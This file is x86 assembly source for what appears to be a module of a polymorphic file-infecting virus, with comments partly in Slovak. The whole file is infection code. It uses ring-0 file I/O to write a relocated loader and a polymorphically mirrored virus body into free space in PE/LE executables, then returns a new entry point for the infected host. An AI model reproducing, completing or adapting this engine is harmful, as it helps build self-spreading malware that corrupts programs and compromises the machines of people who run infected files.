;
; input: Ring0_FileIO - assumed to file stream
;        eax          - poly type
;        edx          - free space allocated at (in file)
;        ebx          - total file length (edx..ebx area for loader)
;        esi          - memmap
;        edi          - loader relocation fx (call here to relocate loader)
;                       !!! only once
;                       params:  ecx - size of dropper, ebx - loader base (rva)
;                       returns: esi          - ptr loader
;                                ecx          - size of loader
;
;        Ring0_FileIO - assumed to file stream
;           eax = R0_READFILE
;           edx = fileptr
;           esi = data ptr
;           ecx = len
;           eax = readed
;
;           eax = R0_WRITEFILE
;           edx = fileptr
;           esi = data ptr (-1 = dropper)
;           ecx = len
;           eax = written
;
;        cez Ring0_FileIO mozes citat a zapisovat priamo do suboru PE/LE/...
;        pricom fileptr znamena offset pri relokovani na 0
;
; output: eax = new entry point
;

ifndef PASS2
include globals.1
else
include globals.2
endif

indep_mod        segment public byte USE32 'CODE'

                 dd   'IMOD'  ; independent module signature


startup:
         cmp       initialize, 0
         je        cont
         ret
cont:
         mov       poly_mode, al
         ; initialize space for polymorphic body (at startup time body isn't encrypted)

         ;int 3
         mov       mem_map, esi
         push      ebx
         mov       relo_ldr, edi
         mov       ecx, body_len
         mov       ebx, edx
         call      [relo_ldr]
         pop       ebx

         mov       new_entry, edx

         ; edx = base
         ; esi = ptr
         ; ecx = len
         mov      eax, R0_WRITEFILE
         call     Ring0_FileIO  ; write loader

         mov      new_size, ecx

         mov      ptr_dropper, -1
         test     poly_mode, POLY_DROPPER
         jne      no_poly_full
         mov      ptr_dropper, edx
         add      ptr_dropper, ecx
         mov      eax, body_len
         add      new_size, eax
no_poly_full:

         mov       eax, body_len
         add       eax, 1024
         mod_call  md_alloc     ; (registers preserved)
         mov       poly_area, eax

         mov       edi, eax
         mov       eax, body_len

         pushad
         call      dword ptr mirrorize  ; create mirror of code
         popad

         mov       esi, edi
         mov       edx, ptr_dropper
         mov       ecx, body_len
         mov       eax, R0_WRITEFILE
         call      Ring0_FileIO




         mov       eax, -1
         mod_call  md_alloc    ; free poly block

         mov       eax, new_entry
         mov       ecx, new_size

         ret

poly_area dd 0
poly_mode db 0
ptr_dropper dd -1
new_size  dd 0
new_entry dd 0
relo_ldr  dd 0
mem_map   dd 0

indep_mod       ends

                end
